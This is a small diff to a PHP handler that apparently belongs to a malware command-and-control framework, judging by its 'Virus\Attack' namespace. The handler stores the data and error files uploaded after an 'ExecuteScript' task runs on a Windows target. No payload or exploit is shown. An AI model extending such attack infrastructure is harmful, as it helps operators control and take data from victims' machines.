@@ -1,11 +1,13 @@
 <?php
 
-if (isset($_FILES["dataFile"]) && isset($_FILES["errFile"])) {
-    $data = file_get_contents($_FILES["dataFile"]["tmp_name"]);
-    $error = file_get_contents($_FILES["errFile"]["tmp_name"]);
+use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript;
 
-    $this->setData($data);
-    $this->setError($error);
-    $this->setExecuted();
-    $this->saveState();
-}
+/** @var ExecuteScript $this */
+
+$data = $this->requestData->fileCheck("dataFile");
+$error = $this->requestData->fileCheck("errFile");
+
+$this->setData($data);
+$this->setError($error);
+$this->setExecuted();
+$this->saveState();
